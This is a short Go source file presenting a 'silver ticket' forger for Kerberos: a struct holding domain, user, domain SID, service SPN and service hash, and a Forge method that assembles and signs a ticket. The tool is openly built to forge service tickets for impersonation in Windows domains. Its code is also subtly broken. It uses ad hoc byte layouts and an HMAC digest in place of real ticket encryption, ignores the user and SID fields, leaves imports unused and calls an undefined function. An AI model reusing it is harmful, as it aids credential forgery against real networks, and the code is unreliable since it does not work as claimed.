package kerberos

import (
"crypto/hmac"
"crypto/sha256"
"encoding/hex"
"fmt"
"time"
)

type SilverTicket struct {
Domain        string
Username      string
DomainSID     string
ServiceSPN    string
ServiceHash   string
}

func NewSilverTicket(domain, username, domainSID, serviceSPN, serviceHash string) *SilverTicket {
return &SilverTicket{
Domain:      domain,
Username:    username,
DomainSID:   domainSID,
ServiceSPN:  serviceSPN,
ServiceHash: serviceHash,
}
}

func (s *SilverTicket) Forge() (string, error) {
// Build TGS structure for specific service
ticket := make([]byte, 0)

// Version (5)
ticket = append(ticket, 0x05)

// Ticket type (0x01 for TGS)
ticket = append(ticket, 0x01, 0x00, 0x00, 0x00)

// Realm (domain)
realmBytes := []byte(s.Domain)
ticket = append(ticket, byte(len(realmBytes)))
ticket = append(ticket, realmBytes...)

// SName (service principal)
snameBytes := []byte(s.ServiceSPN)
ticket = append(ticket, byte(len(snameBytes)))
ticket = append(ticket, snameBytes...)

// Pad to align
for len(ticket)%4 != 0 {
ticket = append(ticket, 0x00)
}

// Encrypted part with service hash
key, _ := hex.DecodeString(s.ServiceHash)
h := hmac.New(sha256.New, key)
h.Write(ticket)
encryptedPart := h.Sum(nil)

finalTicket := make([]byte, 0)
finalTicket = append(finalTicket, ticket...)
finalTicket = append(finalTicket, encryptedPart...)

return base64Encode(finalTicket), nil
}
